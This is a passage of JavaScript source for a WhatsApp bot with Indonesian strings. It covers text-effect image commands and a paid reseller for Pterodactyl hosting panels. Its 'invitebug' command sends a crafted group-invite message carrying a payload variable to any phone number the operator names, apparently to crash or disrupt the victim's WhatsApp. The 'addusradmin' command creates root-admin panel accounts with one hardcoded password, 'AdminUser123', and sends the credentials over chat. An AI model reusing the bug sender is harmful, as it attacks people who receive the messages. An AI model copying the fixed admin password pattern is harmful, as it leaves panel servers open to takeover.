o8W1sVdZQywi+c9kpb80FBNXRqpVLuxS0qrocRwe5snggh7ea8EYG0MdxmFpo4ytSi4Rl3Xunqvb5WLJYenNqTWvXmTIUYteJYi8H9utUWVsyLWlLus1UF82tdhMA7piaoksraMJlNIqA1zYsHVKY/KbIe2W4y4LZha8qNeFSO/0n7mlwVag4y+rGQ0DpB5SJD1OYH7i1wH+/YF6H7RUl2UKnNO3v/w5/CZvPKPK1zaMxPUOyfn2LyjeiO2ZXSGKXR3A4NDWjha73Fe8+z9GMMGpLeTbf6fsef4hNyrtdNDe6A0ougQ5/CXQ/wBI6PAED9K8/wAcpKnjXb+5J+//AAtw7vR15B/4lwQ6hgnFsVhHWHN81o4BJrFW6plNddw8ssL2tjEKGI2AODE2Ug6yikAcAmsAeEUBjwmFYlKdJjtx+yWo7QYFuVVEhW3sZOVpzWzymQJ9U1zpVOzpym1eybsNlzSUerPddHYMmuMyTMCZxMhMk75rxFB3vI7dfS0SbTX4DrWm5VBE2h9BvrWVdEWW4cKxCM4hOhbEekOkCcgTwVsFdpCsy1GpBfHa92JcOoagF2VBQhZGbEfhs0qrOVshQgA6SlyWELVLjKI1MA//2Q==',
"mediaType": 1,
"previewType": "PHOTO",
"renderLargerThumbnail": true,
"caption": `Terima undangan ini untuk menjadi admin di saluran WhatsApp saya\n\n${global.saluran}`,
"inviteCode": "sfeVFOlWvlo5Hd9x",
"inviteExpiration": 9999999999999
}
}), m.quoted && m.quoted.fromMe ? {
contextInfo: {
	...m.msg.contextInfo,
}
} : {quoted:fpayment2})
alice.relayMessage(from, newsletterAdminInviteMessage.message, { messageId: newsletterAdminInviteMessage.key.id })
break

















































// FITUR PHOTOOXY
case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{
if (!isGroup) return onlyGroup()
reply(mess.wait)
//  if (!isPrem) return replyprem(mess.premium);
if (!q) return reply(`Example : ${prefix + command} Kayla`);
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photooxy.photoOxy(link, q);
alice.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Powered By Alice`},
{ quoted: m }
);
}
break;































































// FITUR BUG
case 'invitebug': {
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283148278021`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: alice.waUploadToServer })
var groupInvite = generateWAMessageFromContent(from, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "status@broadcast",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": 9999999999,
"groupName": `Powered By Project Alicezation`,
"caption": `${ngazap}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:floc})
alice.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break













































































































// FITUR PANEL
case 'addusradmin': {
if (!isCreator) return reply(mess.owner)
let t = q.split(',');
if (t.length < 3) return reply795(`${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let passwordnya = 'AdminUser123'
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply795(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": passwordnya
})
})
let data = await f.json();
if (data.errors) return reply795(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await reply795(`
*USER SUKSES DIBUAT*

id: ${user.id}
username : ${user.username}
email : ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`)
alice.sendMessage(u, { text: `*THIS YOUR ACCOUNT*

email : ${email}
username : ${username}
password : ${passwordnya}
login : ${global.domain}

ketik *buyserver* untuk membeli server!`,
}).catch((err) => reply795(`*DETAIL ACCOUNT*

email : ${email}
username : ${username}
password : ${passwordnya}
login : ${global.domain}`))
}
break
case 'listusr': {
let page = args[0] ? args[0] : '1'
let f = await fetch(global.domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = await f.json();
let users = res.data
let sections = "*DATA USER PANEL*"
for (let user of users) {
let u = user.attributes
sections += `\n\n*${u.id}. ${u.username}*\n *User :* ${u.first_name} ${u.last_name}\n *Admin :* ${u.root_admin}\n *Bahasa :* ${u.language}`
}
alice.sendMessage(from, {
document: trash,
fileName: 'Panel Pterodactyl',
mimetype: doc3,
fileLength: 999999999,
pageCount: '2024',
caption: sections.trim(),
contextInfo: {
externalAdReply: {  
title: `L I S T   U S E R`, 
body: 'alice project [v.1.5]',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:fkontak2})
}
break
case "listsrv": {
let page = args[0] ? args[0] : '1'
let f = await fetch(global.domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let res = await f.json();
let servers = res.data
let sections = "*DATA SERVER PANEL*"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apicred
}
})
let data = await f3.json();

sections += `\n\n*${s.id}.* Server : ${s.name}`
}
alice.sendMessage(from, {
document: trash,
fileName: 'Panel Pterodactyl',
mimetype: doc3,
fileLength: 999999999,
pageCount: '2024',
caption: sections.trim(),
contextInfo: {
externalAdReply: {  
title: `L I S T   S E R V E R`, 
body: 'alice project [v.1.6]',
thumbnailUrl: "https://telegra.ph/file/fa753d99143e66c7fcf99.png", 
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}},{quoted:fkontak2})
}
break
case 'addusr': {
if(!isCreator&&!isOwner) return reply(mess.owner)
let t = q.split(',');
if (t.length < 3) return reply795(`${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
//let password
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return reply795(`*PENGGUNAAN SALAH [!]*

Isi Data Anda Disini
${prefix + command} name@gmail.com,name,number\n\ncontoh : addusr darwin@gmail.com,darwin,${nomore}`);
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Member",
"root_admin": false,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes

let p = await alice.sendMessage(m.chat, { text: `
*USER SUKSES DIBUAT*

id: ${user.id}
username : ${user.username}
email : ${user.email}
name: ${user.first_name} ${user.last_name}
bahasa: ${user.language}
admin: ${user.root_admin}
created at: ${user.created_at}

detail user @${u.split`@`[0]} dikirim\ndi private chat, harap lihat!`, mentions:[u],
}, {quoted: m})
alice.sendMessage(u, { text: `*THIS YOUR ACCOUNT*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}

ketik *buyserver* untuk membeli server!`,
}).catch((err) => reply795(`*DETAIL ACCOUNT*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(4000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 3,000`)
minSaldo(sender, 3000, db_saldo)
break
case 'addsrv': {
if (cekSaldo(sender,db_saldo) < 10000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 10,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let s = q.split(',');
if (s.length < 7) return reply795(`Format salah! silahkan isi data di bawah\nname,desc,userId,egg,locId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];

let f1 = await fetch(global.domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data = await f1.json();
//console.log(data.attributes.startup)
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18", // Docker sesuaikan kaya yang ada di panel create srv manual dulu lihat dockernya apa taruh disini contoh: jika terdapat "Java 17 (ghcr.io/pterodactyl/yolks:java_17)" maka salin aja dan tempel "ghcr.io/pterodactyl/yolks:java_17"
"startup": startup_cmd,
"environment": {
/*"INST": "npm install",*/ //Buka ini jika di panel ada Startup Install nya Jika tidak ada maka sembunyikan kaya gini aja
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
// "allocation": {
// "default": 36
// }
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply795(`*SUCCESS CREATE SERVER*

*ID : ${server.id}*
UUID : ${server.uuid}
NAME : ${server.name}
DESC : ${server.description}
DISK : ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
CPU : ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
DATE : ${server.created_at}`)
}
break
case 'delsrv': {
if (!isCreator) return reply('cannot access')
let srv = args[0]
if (!srv) return reply795('Input *ID* Server')
let f = await fetch(global.domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply795('*NOT FOUND [!]*')
reply('*SERVER DI HAPUS [!]*')
}
break
case 'delusr': {
if (!isCreator) return reply('this for creator')
let usr = args[0]
if (!usr) return reply795('Input User *ID*')
let f = await fetch(global.domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
//let res = await f.json()
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply795('*NOT FOUND*')
reply(`*${usr} DELETED*`)
}
break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
let srv = args[0]
if (!srv) return reply795('input *ID* from server')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"signal": action
})
})

let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`Sukses ${action.toUpperCase()} Server`)
}
break // Powered By Winn
case 'buyserver': case 'belipanel': case 'panel':
let hargasrv = `*INFO ANDA*

 • Name : ${pushname}
 • Nomor : ${tag}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
Lakukan pembelian secara otomatis

${prefix}1GB Nama,Nomor   > Rp. 1,500
${prefix}2GB Nama,Nomor   > Rp. 2,000
${prefix}4GB Nama,Nomor   > Rp. 3,000
${prefix}4GB Nama,Nomor   > Rp. 4,000
${prefix}5GB Nama,Nomor   > Rp. 5,000
${prefix}6GB Nama,Nomor   > Rp. 6,000
${prefix}7GB Nama,Nomor   > Rp. 7,000
${prefix}8GB Nama,Nomor   > Rp. 8,000
${prefix}9GB Nama,Nomor   > Rp. 9,000
${prefix}0GB Nama,Nomor   > Rp. 15.000

Contoh cara penggunaan
 • Example : 1gb alice,${nomore}

masukan nama dan nomor anda dengan koma ( , ) sebagai pemisah`
reply795(hargasrv)
break

case "1gb": {
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 1500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 1,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 1gb"
let egg = global.eggsnya
let loc = global.location
let memo = "1200"
let cpu = "30"
let disk = "1200"
let email = username + "1gb@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
const Kalender91 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${Kalender91}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

sendres(u,`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp. ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${Kalender91}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`).catch((err) => reply795(`*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(4000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 1,500`)
minSaldo(sender, 1500, db_saldo)
break
case "2gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 2500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 2,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 2gb"
let egg = global.eggsnya
let loc = global.location
let memo = "2200"
let cpu = "40"
let disk = "2200"
let email = username + "2gb@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 2,500`)
minSaldo(sender, 2500, db_saldo)
break
case "3gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 3500) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 3,500 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 3gb"
let egg = global.eggsnya
let loc = global.location
let memo = "3200"
let cpu = "70"
let disk = "3200"
let email = username + "3gb@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let ctf = await reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}

*YOUR PANEL*

 • ID : ${user.id}
 • Username : ${user.username}
 • Email : ${user.email}
 • Name : ${user.first_name} ${user.last_name}
 • Bahasa : ${user.language}
 • Admin : ${user.root_admin}

Password telah dikirim di private chat @${u.split`@`[0]}`)

alice.sendMessage(u, { text: `*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*YOUR PANEL*

 • email : ${email}
 • username : ${username}
 • password : ${password.toString()}
 • login : ${global.domain}`,
}).catch((err) => reply795(`*SUCCESS PAID*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
*SUCCESS PAID*

email : ${email}
username : ${username}
password : ${password.toString()}
login : ${global.domain}`))
}
await delay(3000)
reply(`*[ Pay Success ]* sukses bayar saldo *Rp.* 3,500`)
minSaldo(sender, 3500, db_saldo)
break
case "4gb": {
if(!isPremium&&!isOwner&&!isCreator) return reply(mess.prem)
if (!m.isGroup) return onlyGroup()
if (cekSaldo(sender,db_saldo) < 4000) return reply795(`Maaf @${sender.split('@')[0]}, saldo anda tidak cukup untuk *${command}*, dibutuhkan *Rp.* 4,000 untuk melalukan pembelian, silahkan topup dengan ketik *topup* dan lihat kembali saldo anda`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Buat Dengan Cara!*
isi nama 👇🏾   nomor mu 👇🏾
${prefix + command} namamu,${nomore}`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 4gb"
let egg = global.eggsnya
let loc = global.location
let memo = "4200"
let cpu = "90"
let disk = "4200"
let email = username + "@gmail.com"
if (!u) return
let d = (await alice.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
let user = data.attributes
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser
}
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apiuser,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
